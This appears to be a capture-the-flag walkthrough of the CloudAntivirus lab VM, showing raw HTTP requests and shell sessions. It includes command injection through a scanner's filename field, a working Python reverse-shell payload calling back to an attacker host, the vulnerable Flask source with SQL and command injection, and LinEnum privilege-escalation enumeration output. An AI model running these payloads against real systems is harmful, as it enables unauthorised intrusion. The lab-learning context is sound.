+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSZg.57mt5YvaZ9ZL3xr7vOA2gnSy4aU
+Upgrade-Insecure-Requests: 1
+
+filename=/home/scanner/cloudav_app/test.txt
+
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 238
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 01:59:37 GMT
+
+<pre>
+----------- SCAN SUMMARY -----------
+Known viruses: 6838622
+Engine version: 0.102.2
+Scanned directories: 0
+Scanned files: 0
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 35.103 sec (0 m 35 s)
+</pre>
+
+----------------------------------------------------------------------------------------------------
+
+POST /output HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/scan
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSZg.57mt5YvaZ9ZL3xr7vOA2gnSy4aU
+Upgrade-Insecure-Requests: 1
+
+filename=/etc/passwd; echo test > /home/scanner/cloudav_app/test1.txt
+
+------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 254
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 02:00:48 GMT
+
+<pre>/etc/passwd: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 6838622
+Engine version: 0.102.2
+Scanned directories: 0
+Scanned files: 1
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 33.916 sec (0 m 33 s)
+</pre>
+
+------------------------------------------------------------------------------------------------
+
+POST /output HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/scan
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSZg.57mt5YvaZ9ZL3xr7vOA2gnSy4aU
+Upgrade-Insecure-Requests: 1
+
+filename=/home/scanner/cloudav_app/test1.txt
+
+------------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 278
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 02:01:33 GMT
+
+<pre>/home/scanner/cloudav_app/test1.txt: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 6838622
+Engine version: 0.102.2
+Scanned directories: 0
+Scanned files: 1
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 33.803 sec (0 m 33 s)
+</pre>
+
+
+
+2.3. Obtain a remote shell with the account 'scanner'
+===================================================================================================================================
+
+
+POST /output HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/scan
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 250
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSZg.57mt5YvaZ9ZL3xr7vOA2gnSy4aU
+Upgrade-Insecure-Requests: 1
+
+filename=/etc/passwd; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.22",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.22] from (UNKNOWN) [192.168.1.5] 44908
+/bin/sh: 0: can't access tty; job control turned off
+
+$ id
+uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)
+
+$ pwd
+/home/scanner/cloudav_app
+
+$ ps -ealwf
+F S UID        PID  PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
+4 S root         1     0  0  80   0 - 19488 -      Apr24 ?        00:00:06 /sbin/init maybe-ubiquity
+1 S root         2     0  0  80   0 -     0 -      Apr24 ?        00:00:00 [kthreadd]
+1 I root         4     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [kworker/0:0H]
+1 I root         6     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [mm_percpu_wq]
+1 S root         7     2  0  80   0 -     0 -      Apr24 ?        00:00:17 [ksoftirqd/0]
+1 I root         8     2  0  80   0 -     0 -      Apr24 ?        00:00:03 [rcu_sched]
+1 I root         9     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [rcu_bh]
+1 S root        10     2  0 -40   - -     0 -      Apr24 ?        00:00:00 [migration/0]
+5 S root        11     2  0 -40   - -     0 -      Apr24 ?        00:00:00 [watchdog/0]
+1 S root        12     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [cpuhp/0]
+5 S root        13     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [kdevtmpfs]
+1 I root        14     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [netns]
+1 S root        15     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [rcu_tasks_kthre]
+1 S root        16     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [kauditd]
+1 S root        17     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [khungtaskd]
+1 S root        18     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [oom_reaper]
+1 I root        19     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [writeback]
+1 S root        20     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [kcompactd0]
+1 S root        21     2  0  85   5 -     0 -      Apr24 ?        00:00:00 [ksmd]
+1 S root        22     2  0  99  19 -     0 -      Apr24 ?        00:00:00 [khugepaged]
+1 I root        23     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [crypto]
+1 I root        24     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [kintegrityd]
+1 I root        25     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [kblockd]
+1 I root        26     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ata_sff]
+1 I root        27     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [md]
+1 I root        28     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [edac-poller]
+1 I root        29     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [devfreq_wq]
+1 I root        30     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [watchdogd]
+1 I root        32     2  0  80   0 -     0 -      Apr24 ?        00:00:03 [kworker/0:1]
+1 S root        34     2  0  80   0 -     0 -      Apr24 ?        00:01:01 [kswapd0]
+1 S root        35     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [ecryptfs-kthrea]
+1 I root        77     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [kthrotld]
+1 I root        78     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [acpi_thermal_pm]
+1 S root        79     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [scsi_eh_0]
+1 I root        80     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [scsi_tmf_0]
+1 S root        81     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [scsi_eh_1]
+1 I root        82     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [scsi_tmf_1]
+1 I root        88     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ipv6_addrconf]
+1 I root        97     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [kstrp]
+1 I root       114     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [charger_manager]
+1 I root       179     2  0  60 -20 -     0 -      Apr24 ?        00:00:08 [kworker/0:1H]
+1 S root       188     2  0  80   0 -     0 -      Apr24 ?        00:00:00 [scsi_eh_2]
+1 I root       189     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [scsi_tmf_2]
+1 I root       263     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [raid5wq]
+1 S root       314     2  0  80   0 -     0 -      Apr24 ?        00:00:01 [jbd2/sda2-8]
+1 I root       315     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ext4-rsv-conver]
+4 S root       378     1  0  79  -1 - 23698 -      Apr24 ?        00:00:00 /lib/systemd/systemd-journald
+1 I root       388     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [iscsi_eh]
+1 I root       389     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ib-comp-wq]
+1 I root       390     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ib_mcast]
+1 I root       391     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ib_nl_sa_wq]
+1 I root       392     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [rdma_cm]
+4 S root       407     1  0  80   0 - 26476 -      Apr24 ?        00:00:00 /sbin/lvmetad -f
+1 S root       433     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [loop0]
+1 S root       434     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [loop1]
+4 S systemd+   441     1  0  80   0 - 35478 -      Apr24 ?        00:00:00 /lib/systemd/systemd-timesyncd
+1 I root       471     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [iprt-VBoxWQueue]
+1 I root       517     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [ttm_swap]
+4 S systemd+   583     1  0  80   0 - 20035 -      Apr24 ?        00:00:00 /lib/systemd/systemd-networkd
+4 S systemd+   585     1  0  80   0 - 17653 -      Apr24 ?        00:00:00 /lib/systemd/systemd-resolved
+4 S daemon     694     1  0  80   0 -  7083 -      Apr24 ?        00:00:00 /usr/sbin/atd -f
+1 S root       695     1  0  80   0 -  6344 -      Apr24 ?        00:00:00 /sbin/iscsid
+5 S root       697     1  0  70 -10 -  6470 -      Apr24 ?        00:00:00 /sbin/iscsid
+4 S root       699     1  0  80   0 - 42284 -      Apr24 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+4 S root       705     1  0  80   0 - 23885 -      Apr24 ?        00:00:00 /usr/bin/lxcfs /var/lib/lxcfs/
+4 S root       707     1  0  80   0 -  7507 -      Apr24 ?        00:00:00 /usr/sbin/cron -f
+4 S root       708     1  0  80   0 - 15533 -      Apr24 ?        00:00:00 /lib/systemd/systemd-logind
+4 S root       709     1  0  80   0 - 71558 -      Apr24 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
+4 S syslog     710     1  0  80   0 - 66818 -      Apr24 ?        00:00:00 /usr/sbin/rsyslogd -n
+4 S message+   712     1  0  80   0 - 12549 -      Apr24 ?        00:00:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+4 S root       767     1  0  80   0 -  3722 -      Apr24 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+4 S root       771     1  0  80   0 - 72218 -      Apr24 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
+4 S uuidd      829     1  0  80   0 -  6711 -      Apr24 ?        00:00:00 /usr/sbin/uuidd --socket-activation
+1 S root      1311     2  0  60 -20 -     0 -      Apr24 ?        00:00:00 [loop2]
+4 S root      1343     1  0  80   0 - 157142 -     Apr24 ?        00:00:06 /usr/lib/snapd/snapd
+4 S root      5867     1  0  80   0 - 11291 -      00:21 ?        00:00:00 /lib/systemd/systemd-udevd
+4 S clamav   16368     1  0  80   0 - 57466 -      00:23 ?        00:00:00 /usr/bin/freshclam -d --foreground=true
+4 S root     24809     1  0  80   0 - 18075 -      00:13 ?        00:00:00 /usr/sbin/sshd -D
+1 I root     25527     2  0  80   0 -     0 -      01:57 ?        00:00:00 [kworker/u2:2]
+0 S scanner  25571     1  0  80   0 -  1157 wait   02:23 ?        00:00:00 /bin/sh -c clamscan /etc/passwd; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.22",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+0 S scanner  25573 25571  0  80   0 -  8691 wait   02:24 ?        00:00:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.22",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+0 S scanner  25574 25573  0  80   0 -  1157 wait   02:24 ?        00:00:00 /bin/sh -i
+1 I root     25814     2  0  80   0 -     0 -      02:30 ?        00:00:00 [kworker/u2:0]
+1 I root     25815     2  0  80   0 -     0 -      02:30 ?        00:00:00 [kworker/0:2]
+1 I root     25835     2  0  80   0 -     0 -      02:36 ?        00:00:00 [kworker/u2:1]
+0 R scanner  25856 25574  0  80   0 -  9594 -      02:45 ?        00:00:00 ps -ealwf
+
+$ 
+
+
+
+===================================================================================================================================
+Step 3. Post-exploitation - Linux enumeration (Manual + LinEnum.sh + Linux-exploit-suggester.sh)
+===================================================================================================================================
+
+
+$ ls -al
+total 32
+drwxrwxr-x 4 scanner scanner 4096 Apr 25 02:00 .
+drwxr-xr-x 6 scanner scanner 4096 Oct 24  2018 ..
+-rw-rw-r-- 1 scanner scanner 1550 Oct 24  2018 app.py
+-rw-r--r-- 1 scanner scanner 2048 Oct 21  2018 database.sql
+drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 samples
+drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 templates
+-rw-rw-r-- 1 scanner scanner    5 Apr 25 02:00 test1.txt
+-rw-rw-r-- 1 scanner scanner    5 Apr 25 01:52 test.txt
+
+$ cat database.sql
+��Jitablen<]tablecodecodeCREATE TABLE `code` (
+        `password`      TEXT
+#cloudavtech1mysecondinvitecode+myinvitecode123
+$ 
+
+$ cat app.py
+from flask import Flask, render_template, request, session
+import sqlite3
+import subprocess
+import os
+
+conn = sqlite3.connect('database.sql',check_same_thread = False)
+c = conn.cursor()
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    password = request.form['password']
+    if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:
+        session['logged_in'] = True
+        return 'Redirecting to /scan. <meta http-equiv="refresh" content="0; url=/scan" />'
+    else:
+        return "WRONG INFORMATION"
+
+@app.route('/scan')
+def shop():
+    if session.get('logged_in'):
+        filelist = subprocess.Popen("ls -l /home/scanner/cloudav_app/samples", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()
+        return render_template('scan.html',filelist=filelist)
+    else:
+        return '<meta http-equiv="refresh" content="0; url=/" />'
+
+@app.route('/output', methods=['POST'])
+def output():
+    if session.get('logged_in'):
+        filename = request.form['filename']
+        scan_results = subprocess.Popen("clamscan "+filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()
+        return "<pre>" + scan_results + "</pre>"
+    else:
+        return '<meta http-equiv="refresh" content="0; url=/" />'
+
+if __name__ == "__main__":
+    app.secret_key = os.urandom(12)
+    app.run(host='0.0.0.0',port=8080, debug=True)
+
+$ cd ..
+
+
+$ cd /home
+
+$ ls
+cloudav
+scanner
+
+$ ls -al
+total 16
+drwxr-xr-x  4 root    root    4096 Oct 21  2018 .
+drwxr-xr-x 23 root    root    4096 Oct 21  2018 ..
+drwxr-xr-x  4 cloudav cloudav 4096 Oct 24  2018 cloudav
+drwxr-xr-x  6 scanner scanner 4096 Oct 24  2018 scanner
+
+$ cd cloudav
+
+$ ls -al
+total 28
+drwxr-xr-x 4 cloudav cloudav 4096 Oct 24  2018 .
+drwxr-xr-x 4 root    root    4096 Oct 21  2018 ..
+-rw-r--r-- 1 cloudav cloudav  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 cloudav cloudav 3771 Apr  4  2018 .bashrc
+drwx------ 2 cloudav cloudav 4096 Oct 21  2018 .cache
+drwx------ 3 cloudav cloudav 4096 Oct 21  2018 .gnupg
+-rw-r--r-- 1 cloudav cloudav  807 Apr  4  2018 .profile
+-rw-r--r-- 1 cloudav cloudav    0 Oct 21  2018 .sudo_as_admin_successful
+
+
+<SNIP>
+
+$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+$ ./LinEnum.sh -t
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Enabled
+
+
+Scan started at:
+Sat Apr 25 06:16:06 UTC 2020                                                                                                                                                                             
+                                                                                                                                                                                                         
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux cloudav 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.15.0-36-generic (buildd@lgw01-amd64-031) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.1 LTS"
+NAME="Ubuntu"
+VERSION="18.04.1 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.1 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+
+[-] Hostname:
+cloudav
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+cloudav          tty1                      Wed Oct 24 00:27:55 +0000 2018
+scanner          tty1                      Wed Oct 24 00:27:29 +0000 2018
+
+
+[-] Who else is logged on:
+ 06:16:06 up  2:53,  0 users,  load average: 0.01, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
+uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
+uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
+uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=108(landscape) gid=112(landscape) groups=112(landscape)
+uid=109(pollinate) gid=1(daemon) groups=1(daemon)
+uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(cloudav) gid=1000(cloudav) groups=1000(cloudav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)
+uid=111(clamav) gid=113(clamav) groups=113(clamav)
+
+
+[-] It looks like we have some admin users:
+uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
+uid=1000(cloudav) gid=1000(cloudav) groups=1000(cloudav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+cloudav:x:1000:1000:cloudav:/home/cloudav:/bin/bash
+scanner:x:1001:1001:scanner,,,:/home/scanner:/bin/bash
+clamav:x:111:113::/var/lib/clamav:/bin/false
+
+
+[-] Super user account(s):
+root
+
+
+[-] Accounts that have recently used sudo:
+/home/cloudav/.sudo_as_admin_successful
+
+
+[-] Are permissions on /home directories lax:
+total 16K
+drwxr-xr-x  4 root    root    4.0K Oct 21  2018 .
+drwxr-xr-x 23 root    root    4.0K Oct 21  2018 ..
+drwxr-xr-x  4 cloudav cloudav 4.0K Oct 24  2018 cloudav
+drwxr-xr-x  6 scanner scanner 4.0K Apr 25 02:57 scanner
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+LANG=en_US.UTF-8
+OLDPWD=/home
+PWD=/home/scanner
+HOME=/home/scanner
+SHELL=/bin/sh
+WERKZEUG_RUN_MAIN=true
+SHLVL=1
+LOGNAME=scanner
+WERKZEUG_SERVER_FD=4
+PATH=/usr/bin:/bin
+_=/usr/bin/env
+
+
+[-] Path information:
+/usr/bin:/bin
+drwxr-xr-x 2 root root  4096 Apr 25 00:21 /bin
+drwxr-xr-x 2 root root 24576 Apr 25 00:23 /usr/bin
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+/usr/bin/tmux
+/usr/bin/screen
+
+
+[-] Current umask value:
+0002
+u=rwx,g=rwx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK           022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Jul 25  2018 .
+drwxr-xr-x 94 root root 4096 Apr 25 00:23 ..
+-rw-r--r--  1 root root  589 Jun 26  2018 mdadm
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rw-r--r--  1 root root  190 Jul 25  2018 popularity-contest
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x  2 root root 4096 Apr 25 00:22 .
+drwxr-xr-x 94 root root 4096 Apr 25 00:23 ..
+-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
+-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  539 Jun 26  2018 mdadm
+-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
+-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+-rwxr-xr-x  1 root root  214 Jun 27  2018 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Jul 25  2018 .
+drwxr-xr-x 94 root root 4096 Apr 25 00:23 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Jul 25  2018 .
+drwxr-xr-x 94 root root 4096 Apr 25 00:23 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Jul 25  2018 .
+drwxr-xr-x 94 root root 4096 Apr 25 00:23 ..
+-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  211 Jun 27  2018 update-notifier-common
+
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[-] Jobs held by all users:
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot cd /home/scanner/cloudav_app && /usr/bin/python app.py
+
+
+[-] Systemd timers:
+NEXT                         LEFT           LAST                         PASSED               UNIT                         ACTIVATES
+Sat 2020-04-25 06:39:36 UTC  3h 38min left  Fri 2020-04-24 23:55:08 UTC  3h 5min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2020-04-25 13:57:44 UTC  10h left       Fri 2020-04-24 23:55:08 UTC  3h 5min ago          apt-daily.timer              apt-daily.service
+Sun 2020-04-26 00:10:00 UTC  21h left       Sat 2020-04-25 00:10:00 UTC  2h 50min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Mon 2020-04-27 00:00:00 UTC  1 day 20h left Fri 2020-04-24 23:55:08 UTC  3h 5min ago          fstrim.timer                 fstrim.service
